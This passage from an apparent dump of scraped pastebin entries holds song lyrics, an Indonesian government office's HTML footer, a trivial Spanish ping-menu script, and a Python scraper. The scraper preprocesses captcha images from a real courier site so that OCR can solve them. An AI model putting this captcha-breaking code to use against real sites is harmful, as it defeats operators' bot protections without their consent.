'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='datafile', title='Dance When You Cry  Dance When You Cry - Fiji Blue  | HoatHinh.tv | bzDUCUDSyyo2', content="Lời bài hát Dance When You Cry \xa0Dance When You Cry - Fiji Blue \xa0| HoatHinh.tv | bzDUCUDSyyo2 Lyrics up by vnflix.com [Verse 1]\nIt's alright\nThat you've been dancing alone the whole night\nYou get lost in the lows and the highs\nYou don't care if it shows\nSometimes (Sometimes)\nThere's a chance for hellos and goodbyes (Goodbyes)\nWhen there's nobody left It's alright\n'Cause you're fine on your own\n\xa0\n[Pre-Chorus]\nYou know you're not afraid\nWhen you're in your darkest place\n\xa0\n\xa0\n[Chorus]\nIt's one of those nights, you dance when you cry\nThere's no point in hiding those feelings inside of you\nIt's one of those nights, you dance when you cry\nThеre's no point in stopping\nWho cares if they'rе watching you, baby?\n\xa0\n[Post-Chorus]\nIt's one of those nights, you dance when you cry\nThere's no point in stopping\nWho cares if they're watching you, baby?\n\xa0\n[Verse 2]\nIt's alright\nIf you don't answer the door sometimes\nYou leave your tears on the floor when you fly\nNo one knows how high you'll go\nNow that you're alone\n\xa0\n[Pre-Chorus]\nYou know you're not afraid\nWhen you're in your darkest place\n\xa0\n[Chorus]\nIt's one of those nights, you dance when you cry\nThere's no point in hiding those feelings inside of you\nIt's one of those nights, you dance when you cry\nThere's no point in stopping\nWho cares if they're watching you, baby?\n\xa0\n\xa0\n[Post-Chorus]\n(It's one of those of nights, it's one of those of nights)\n(It's one of those of nights, it's one of those of nights)\nIt's one of those nights, you dance when you cry\nThere's no point in stopping\nWho cares if they're watching you, baby?\n\xa0\n[Outro]\n(It's one of those of nights)\n(It's one of those of nights)", date='2022-06-01 09:25:11 +00:00', hash_val='e31208a173b7feed60da85dbf7fb1cfe', url='/QtqFRCg5', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='aldinokemal', title='Elearning - Footer', content='<div class=""c-footer-nav row text-sm-center text-md-left"">\n\xa0 \xa0 <div class=""col-sm-12 col-md-6 col-lg mb-sm-4 mb-lg-0"">\n\xa0 \xa0 \xa0 \xa0 <h4 class=""c-footer-list-item-header"">Diskominfo Kabupaten Bantul</h4>\n\xa0 \xa0 \xa0 \xa0 <ul class=""c-footer-list"">\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <a href=""https://diskominfo.bantulkab.go.id/hal/visi-dan-misi"">Visi dan Misi</a>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 </li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <a href=""https://diskominfo.bantulkab.go.id/news"" target=""_blank"">Berita</a>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 </li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <a href=""https://diskominfo.bantulkab.go.id/announcements"">Pengumuman</a>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 </li>\n\xa0 \xa0 \xa0 \xa0 </ul>\n\xa0 \xa0 </div>\n\xa0 \xa0 <div class=""col-sm-12 col-md-6 col-lg mb-sm-4 mb-lg-0"">\n\xa0 \xa0 \xa0 \xa0 <h4 class=""c-footer-list-item-header""><span>Hubungi Kami</span></h4>\n\xa0 \xa0 \xa0 \xa0 <ul class=""c-footer-list"">\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <a href=""mailto:diskominfo@bantulkab.go.id"">Email: diskominfo@bantulkab.go.id</a>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 </li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <a href=""https://wa.me/6289685024091"">Whatsapp: 6289685024091</a>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 </li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <a href=""#"">Telepon: 0274367509</a>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 </li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <li>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <a href=""https://diskominfo.bantulkab.go.id/contact-us"">Selengkapnya</a>\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 </li>\n\xa0 \xa0 \xa0 \xa0 </ul>\n\xa0 \xa0 </div>\n\xa0 \xa0 <div class=""col-sm-12 col-md-6 col-lg mb-sm-4 mb-lg-0"">\n\xa0 \xa0 \xa0 \xa0 <h4 class=""c-footer-list-item-header"">Lokasi</h4>\n\xa0 \xa0 \xa0 \xa0 <ul class=""c-footer-list"">\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 <li><span style=""font-size: 0.85rem;"">Dinas Komunikasi dan Informatika Kabupaten Bantul Komplek Parasamya, Jl. RW Monginsidi Nomor 1 Bantul</span></li>\n\xa0 \xa0 \xa0 \xa0 </ul>\n\xa0 \xa0 </div>\n</div>', date='2022-06-01 09:08:27 +00:00', hash_val='192f6358341df3d57e55298a5d37d6c3', url='/C4b3ZKSG', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='wheresTheAnyKey', title='Paste Ping', content='PasteBin API Check', date='2022-06-01 09:01:22 +00:00', hash_val='e522a815c1ef8d8bb15910a6ed3f5b6c', url='/WDAvn4HM', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='fueradeservicio', title='n_tgt muestra dirección pero no el contenido', content='### Importamos las funciones que necesitamos ###\n\xa0\nimport os \xa0# Lo necesitamos para ping\n\xa0\n### Fin de importación funciones\n\xa0\n\xa0\n\xa0\n### Definimos \xa0variables ###\n\xa0\n### Fin definición de variables ###\n\xa0\n\xa0\n\xa0\n\xa0\n### Definimos las funciones\n\xa0\n#Mostramos el cartel\ndef presentacion():\n\xa0 \xa0 print()\n\xa0 \xa0 print()\n\xa0 \xa0 print(\' \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 ########## PYDESK ##########\')\n\xa0 \xa0 print()\n\xa0 \xa0 print(\' ** SCRIPT QUE FACILITA ALGUNAS DE LAS ACCIONES MÁS HABITUALES EN EL SISTEMA ** \')\n\xa0 \xa0 print()\n\xa0\n\xa0\n#Mostramos el menú de eleccion\ndef menu_acciones():\n\xa0 \xa0 print()\n\xa0 \xa0 print()\n\xa0 \xa0 print(\'1) HACER PING AL TERMINAL\')\n\xa0 \xa0 print()\n\xa0 \xa0 print(\'2) POR DEFINIR...\')\n\xa0 \xa0 print()\n\xa0 \xa0 print(\'3) POR DEFINIR...\')\n\xa0 \xa0 print()\n\xa0 \xa0 print(\'4) SALIR\')\n\xa0 \xa0 print()\n\xa0 \xa0 opcion = input(""ELIGE UNA OPCIÓN: "")\n\xa0 \xa0 print(\'Esta es la opción elegida dentro de la funcion: \', opcion)\n\xa0 \xa0 return opcion\n\xa0\n\xa0\n#Funcion que elige la TGT\ndef n_tgt():\n\xa0 \xa0 tgt = input(\'Por favor, intoduce la TGT: \')\n\xa0 \xa0 print(\'Desde la funcion de n_tgt vemos la \xa0TGT elegida \', tgt)\n\xa0 \xa0 return tgt\n\xa0\n\xa0\n\xa0\n#Funcion que hace ping\ndef haz_ping_a(x):\n\xa0 \xa0 print(\'Estamos haciendo ping a \', x \xa0)\n\xa0 \xa0 return x\n\xa0\n\xa0\n\xa0\n\xa0\n\xa0\n\xa0\n### CUERPO ###\n\xa0\n#Llamamos a las funciones presentacion y menu_acciones\npresentacion()\nmenu_acciones()\nn_tgt()\nhaz_ping_a(n_tgt)', date='2022-06-01 08:57:18 +00:00', hash_val='39bcca476b285ca43c0d46f4c39865a0', url='/n3KceSd6', timezones={'CST': tzfile('/usr/share/zoneinfo/US/Central'), 'CDT': tzfile('/usr/share/zoneinfo/US/Central'), 'EST': tzfile('/usr/share/zoneinfo/US/Eastern'), 'EDT': tzfile('/usr/share/zoneinfo/US/Eastern'), 'MST': tzfile('/usr/share/zoneinfo/US/Mountain'), 'MDT': tzfile('/usr/share/zoneinfo/US/Mountain'), 'PST': tzfile('/usr/share/zoneinfo/US/Pacific'), 'PDT': tzfile('/usr/share/zoneinfo/US/Pacific'), 'UTC': tzfile('/usr/share/zoneinfo/UTC')}), DataStructure(author='Merevoli', title='Untitled', content='# -*- coding: utf-8 -*-\nimport io\nimport string\nfrom contextlib import suppress\n\xa0\nimport cv2\nimport dateutil.parser as dateparser\nfrom pp_scraper.mixins import CookieMixin\nimport numpy as np\nimport pytesseract\nfrom collections import deque\nimport math\nimport urllib3\nfrom PIL import Image, ImageEnhance\nfrom pp_scraper import activity_logger\nfrom pp_scraper.spiders.BaseScraper import BaseScraperItemPipeline\nfrom scrapy.http import Request, FormRequest\n\xa0\nRETSCN_BASE_URL = ""http://www.ets-express.com/admin.php/Home/Yanzhengma/index""\nRETSCN_TRACK_URL = ""http://www.ets-express.com/Home/Index/guiji.html""\n\xa0\nACCEPT_CHARS = string.ascii_letters + string.digits\n\xa0\n\xa0\ndef post_process_captcha(captcha: str) -> str:\n\xa0 \xa0 """"""\n \xa0 \xa0tesseract sometimes produces extra special characters (like ""\'"", ""-"")\n \xa0 \xa0and securimage seems to only generate alphanumeric character\n \xa0 \xa0""""""\n\xa0 \xa0 output = """"\n\xa0 \xa0 for c in captcha:\n\xa0 \xa0 \xa0 \xa0 if c in ACCEPT_CHARS:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 output += c\n\xa0 \xa0 return output\n\xa0\n\xa0\n\xa0 \xa0 \xa0 \xa0\ndef denoise_image(image):\n\xa0 \xa0 # 1.1. denoise image using PIL\n\xa0 \xa0 image = denoise_image_pil(image)\n\xa0\n\xa0 \xa0 # 1.2. denoise image manually to remove the small objects (using BFS algorithm)\n\xa0 \xa0 image = remove_small_objects(image)\n\xa0 \xa0 return image\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0\ndef denoise_image_pil(image):\n\xa0 \xa0 image = image.convert(\'L\')\n\xa0\n\xa0 \xa0 image = image.point(lambda p: p > 150 and 255)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 return image\n\xa0 \xa0 \xa0 \xa0 \xa0\ndef remove_small_objects(image):\n\xa0 \xa0 width, height = image.size\n\xa0 \xa0 STEPS = (\n\xa0 \xa0 \xa0 \xa0 (1, 0),\n\xa0 \xa0 \xa0 \xa0 (0, 1),\n\xa0 \xa0 \xa0 \xa0 (-1, 0),\n\xa0 \xa0 \xa0 \xa0 (0, -1), \xa0 \xa0 \xa0 \xa0\n\xa0 \xa0 )\n\xa0 \xa0 WHITE_COLOR = 255\n\xa0\n\xa0 \xa0 def is_in_range(pos):\n\xa0 \xa0 \xa0 \xa0 return 0 <= pos[0] < width and 0 <= pos[1] < height\n\xa0\n\xa0 \xa0 def bfs(pos):\n\xa0 \xa0 \xa0 \xa0 queue = deque()\n\xa0 \xa0 \xa0 \xa0 queue.append(pos)\n\xa0 \xa0 \xa0 \xa0 visited_points = set()\n\xa0 \xa0 \xa0 \xa0 visited_points.add(pos)\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 while len(queue):\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 current_pos = queue.popleft()\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for step in STEPS:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 next_pos = (current_pos[0] + step[0], current_pos[1] + step[1])\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if is_in_range(next_pos) and image.getpixel(next_pos) != WHITE_COLOR and next_pos not in visited_points:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 visited_points.add(next_pos)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 queue.append(next_pos) \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 if len(visited_points) <= 30:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for point in visited_points:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 image.putpixel(point, WHITE_COLOR)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 for x in range(width):\n\xa0 \xa0 \xa0 \xa0 for y in range(height):\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if image.getpixel((x, y)) != WHITE_COLOR:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 bfs((x, y))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 return image\n\xa0\ndef delate_image(image):\n\xa0 \xa0 total_visited_points = set()\n\xa0 \xa0 height, width = image.shape\n\xa0 \xa0 STEPS = (\n\xa0 \xa0 \xa0 \xa0 (1, 0),\n\xa0 \xa0 \xa0 \xa0 (0, 1),\n\xa0 \xa0 \xa0 \xa0 (-1, 0),\n\xa0 \xa0 \xa0 \xa0 (0, -1), \xa0 \xa0 \xa0 \xa0\n\xa0 \xa0 )\n\xa0 \xa0 WHITE_COLOR = 255\n\xa0\n\xa0\n\xa0 \xa0 def is_in_range(pos):\n\xa0 \xa0 \xa0 \xa0 return 0 <= pos[0] < width and 0 <= pos[1] < height\n\xa0\n\xa0 \xa0 def bfs(pos):\n\xa0 \xa0 \xa0 \xa0 queue = deque()\n\xa0 \xa0 \xa0 \xa0 queue.append(pos)\n\xa0 \xa0 \xa0 \xa0 visited_points = set()\n\xa0 \xa0 \xa0 \xa0 black_visited_points = set()\n\xa0 \xa0 \xa0 \xa0 visited_points.add(pos)\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 while len(queue):\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 current_pos = queue.popleft()\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for step in STEPS:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 next_pos = (current_pos[0] + step[0], current_pos[1] + step[1])\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if is_in_range(next_pos) and image[next_pos[1], next_pos[0]] == WHITE_COLOR and next_pos not in visited_points:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 visited_points.add(next_pos)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 queue.append(next_pos) \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 elif is_in_range(next_pos) and image[next_pos[1], next_pos[0]] != WHITE_COLOR and next_pos not in black_visited_points:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 black_visited_points.add(next_pos)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 for point in black_visited_points:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 image[point[1], point[0]] = 100\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 visited_points.add(point)\n\xa0\n\xa0 \xa0 \xa0 \xa0 return visited_points \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 # for x in range(width):\n\xa0 \xa0 # \xa0 \xa0 for y in range(height):\n\xa0 \xa0 # \xa0 \xa0 \xa0 \xa0 if image[y, x] == WHITE_COLOR and (x, y) not in total_visited_points:\n\xa0 \xa0 visited_points = bfs((0, 0))\n\xa0 \xa0 total_visited_points.update(visited_points)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 # break\n\xa0\n\xa0 \xa0 return image\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \ndef split_image(image):\n\xa0 \xa0 SPLITED_IMAGE_SIZE = (30, 30)\n\xa0 \xa0 total_visited_points = set()\n\xa0 \xa0 height, width = image.shape\n\xa0 \xa0 STEPS = (\n\xa0 \xa0 \xa0 \xa0 (1, 0),\n\xa0 \xa0 \xa0 \xa0 (0, 1),\n\xa0 \xa0 \xa0 \xa0 (-1, 0),\n\xa0 \xa0 \xa0 \xa0 (0, -1), \xa0 \xa0 \xa0 \xa0\n\xa0 \xa0 )\n\xa0 \xa0 WHITE_COLOR = 255\n\xa0\n\xa0 \xa0 def point_to_image(points):\n\xa0 \xa0 \xa0 \xa0 min_x = min(map(lambda point: point[0], points))\n\xa0 \xa0 \xa0 \xa0 max_x = max(map(lambda point: point[0], points))\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 min_y = min(map(lambda point: point[1], points))\n\xa0 \xa0 \xa0 \xa0 max_y = max(map(lambda point: point[1], points))\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 image = np.empty((max_y - min_y + 1, max_x - min_x + 1, 1), dtype = ""uint8"")\n\xa0 \xa0 \xa0 \xa0 image.fill(255)\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 for point in points:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 image[point[1] - min_y, point[0] - min_x] = 0\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 x_space = SPLITED_IMAGE_SIZE[0] - (max_x - min_x + 1)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 image = cv2.copyMakeBorder(\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 image,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 top=SPLITED_IMAGE_SIZE[1] - (max_y - min_y + 1),\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 bottom=10,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 left=x_space//2,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 right=x_space - x_space//2,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 borderType=cv2.BORDER_CONSTANT,\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 value=(255, 255, 255)\n\xa0 \xa0 \xa0 \xa0 ) \xa0 \xa0\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 return image\n\xa0\n\xa0 \xa0 def is_in_range(pos):\n\xa0 \xa0 \xa0 \xa0 return 0 <= pos[0] < width and 0 <= pos[1] < height\n\xa0\n\xa0 \xa0 def bfs(pos):\n\xa0 \xa0 \xa0 \xa0 queue = deque()\n\xa0 \xa0 \xa0 \xa0 queue.append(pos)\n\xa0 \xa0 \xa0 \xa0 visited_points = set()\n\xa0 \xa0 \xa0 \xa0 visited_points.add(pos)\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 while len(queue):\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 current_pos = queue.popleft()\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 for step in STEPS:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 next_pos = (current_pos[0] + step[0], current_pos[1] + step[1])\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if is_in_range(next_pos) and image[next_pos[1], next_pos[0]] != WHITE_COLOR and next_pos not in visited_points:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 visited_points.add(next_pos)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 queue.append(next_pos) \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 return visited_points \xa0 \n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 images = []\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 for x in range(width):\n\xa0 \xa0 \xa0 \xa0 for y in range(height):\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if image[y, x] != WHITE_COLOR and (x, y) not in total_visited_points:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 visited_points = bfs((x, y))\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 total_visited_points.update(visited_points)\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 images.append(point_to_image(visited_points))\n\xa0\n\xa0 \xa0 try:\n\xa0 \xa0 \xa0 \xa0 assert(len(images) == 4)\n\xa0 \xa0 except Exception:\n\xa0 \xa0 \xa0 \xa0 print(""sticky image"")\n\xa0\n\xa0 \xa0 return images\n\xa0 \xa0 \ndef make_inner_border(image):\n\xa0 \xa0 height, width = image.shape\n\xa0 \xa0 image = cv2.line(image, (0, 0), (0, height), (255, 255, 255), 2)\n\xa0 \xa0 image = cv2.line(image, (0, 0), (width, 0), (255, 255, 255), 2)\n\xa0 \xa0 image = cv2.line(image, (width, 0), (width, height), (255, 255, 255), 2)\n\xa0 \xa0 image = cv2.line(image, (0, height), (width, height), (255, 255, 255), 2)\n\xa0 \xa0 return image\n\xa0 \xa0 \ndef coordinate_character(image):\n\xa0 \xa0 BOTTOM_DISTANCE = 8\n\xa0 \xa0 height, width = image.shape\n\xa0 \xa0 \n\xa0 \xa0 y = height - 1\n\xa0 \xa0 \n\xa0 \xa0 while y >= 0:\n\xa0 \xa0 \xa0 \xa0 is_bottom_y = False\n\xa0 \xa0 \xa0 \xa0 for x in range(width):\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 if image[y][x] != 255:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 is_bottom_y = True\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 \xa0 break\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 if is_bottom_y:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 break\n\xa0 \xa0 \xa0 \xa0 y -= 1\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 move_matrix = np.float32([[1, 0, 0], [0, 1, height - BOTTOM_DISTANCE - y]])\n\xa0 \xa0 dimensions = (width, height)\n\xa0 \xa0 return cv2.warpAffine(image, move_matrix, dimensions, borderValue=255)\n\xa0\ndef deskew_image(image):\n\xa0 \xa0 # 3.1. make a white inner border to remove sticky parts when spliting images -> get correct contour\n\xa0 \xa0 image = make_inner_border(image)\n\xa0 \xa0 \n\xa0 \xa0 # 3.2. get the contour for character\n\xa0 \xa0 contours, hierarchy = cv2.findContours(image, cv2.RETR_TREE, cv2.CHAIN_APPROX_SIMPLE)\n\xa0 \xa0 if len(contours) > 1:\n\xa0 \xa0 \xa0 \xa0 contour = contours[1]\n\xa0 \xa0 else:\n\xa0 \xa0 \xa0 \xa0 contour = contours[0]\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 # 3.3. get the minimum area rectangle of contour\n\xa0 \xa0 rect = cv2.minAreaRect(contour)\n\xa0 \xa0 fbox = cv2.boxPoints(rect)\n\xa0 \xa0 box = np.int0(fbox)\n\xa0 \xa0 # image = cv2.drawContours(image,[box], 0, (100,100,100), 1)\n\xa0 \xa0 \n\xa0 \xa0 # 3.4. get the center line\n\xa0 \xa0 rows, cols = image.shape[:2]\n\xa0 \xa0 vx, vy, x, y = cv2.fitLine(contour, cv2.DIST_L2, 0, 0.01, 0.01)\n\xa0 \xa0 lefty = int((-x * vy / vx) + y)\n\xa0 \xa0 righty = int(((cols - x) * vy / vx) + y)\n\xa0 \xa0 \n\xa0 \xa0 left_point = (0, lefty)\n\xa0 \xa0 right_point = (cols - 1, righty)\n\xa0 \xa0 # image = cv2.line(image, right_point, left_point, (0,255,0), 1)\n\xa0 \xa0 \n\xa0 \xa0 is_left_inclined_line = (lefty < righty)\n\xa0 \xa0 \n\xa0 \xa0 # M = cv2.moments(contour)\n\xa0 \xa0 # cX = int(M[""m10""] / M[""m00""])\n\xa0 \xa0 # cY = int(M[""m01""] / M[""m00""])\n\xa0\n\xa0 \xa0 # 3.5. get 2 top points & calculate the angle\n\xa0 \xa0 fbox = sorted(fbox, key=lambda point: point[1])\n\xa0 \xa0 top_point_1 = fbox[0]\n\xa0 \xa0 top_point_2 = fbox[1]\n\xa0 \xa0 \n\xa0 \xa0 is_left_angle = (top_point_1[0] > top_point_2[0])\n\xa0 \xa0 \n\xa0 \xa0 # 3.5.1. using tan function in Trigonometry\n\xa0 \xa0 height = abs(top_point_1[1] - top_point_2[1])\n\xa0 \xa0 base = abs(top_point_1[0] - top_point_2[0])\n\xa0 \xa0 angle = math.degrees(math.atan(height/base))\n\xa0 \xa0 \n\xa0 \xa0 if is_left_angle:\n\xa0 \xa0 \xa0 \xa0 angle = -angle\n\xa0 \xa0 \n\xa0 \xa0 # print(abs(abs(angle) - 45), is_left_angle, is_left_inclined_line)\n\xa0 \xa0 # using center line to check 2 top points when the angle nearly 45 degree\n\xa0 \xa0 if abs(abs(angle) - 45) <= 5 and is_left_inclined_line != is_left_angle:\n\xa0 \xa0 \xa0 \xa0 top_point_2 = fbox[2]\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 is_left_angle = (top_point_1[0] > top_point_2[0])\n\xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 height = abs(top_point_1[1] - top_point_2[1])\n\xa0 \xa0 \xa0 \xa0 base = abs(top_point_1[0] - top_point_2[0])\n\xa0 \xa0 \xa0 \xa0 angle = math.degrees(math.atan(height/base))\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 \xa0 \xa0 if is_left_angle:\n\xa0 \xa0 \xa0 \xa0 \xa0 \xa0 angle = -angle\n\xa0 \xa0 \xa0 \xa0 \n\xa0 \xa0 # print(angle)\n\xa0\n\xa0 \xa0 # 3.6. deskew the image\n\xa0 \xa0 (h, w) = image.shape[:2]\n\xa0 \xa0 center = (w // 2, h // 2)\n\xa0 \xa0 M = cv2.getRotationMatrix2D(center, angle, 1.0)\n\xa0 \xa0 image = cv2.warpAffine(image, M, (w, h), flags=cv2.INTER_CUBIC, borderMode=cv2.BORDER_REPLICATE)\n\xa0 \xa0 \n\xa0 \xa0 return image\n\xa0\ndef preprocess_image(image): \n\xa0 \xa0 image.save(""output_image_retscn_origin.png"")\n\xa0 \xa0 # 1. denoise image\n\xa0 \xa0 image = denoise_image(image)\n\xa0 \xa0 \n\xa0 \xa0 # convert PIL image to 